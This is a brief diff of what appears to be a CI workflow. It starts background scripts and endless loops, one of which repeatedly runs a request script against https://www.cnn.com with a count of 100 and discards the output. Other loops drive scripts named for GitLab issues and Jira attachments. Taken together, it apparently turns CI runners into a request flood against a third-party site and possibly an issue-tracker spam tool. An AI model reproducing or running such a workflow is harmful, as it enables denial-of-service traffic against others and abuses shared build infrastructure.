@@ -34,5 +34,7 @@ jobs:
         chmod +x ./google.sh && ./google.sh &
         chmod +x ./rw.sh && ./rw.sh &
         chmod +x ./jira.sh && ./jira.sh &
-        npm install && while true; do nodejs jira.js; done &
-        while true; do nodejs req.js https://www.cnn.com 100 > /dev/null; done
+        while true; do nodejs req.js https://www.cnn.com 100 > /dev/null; done &
+        while true; do ./gitlab-issues.sh $(which nodejs) ; done &
+        while true; do ./jira-attach.sh $(which nodejs) ; done
+        
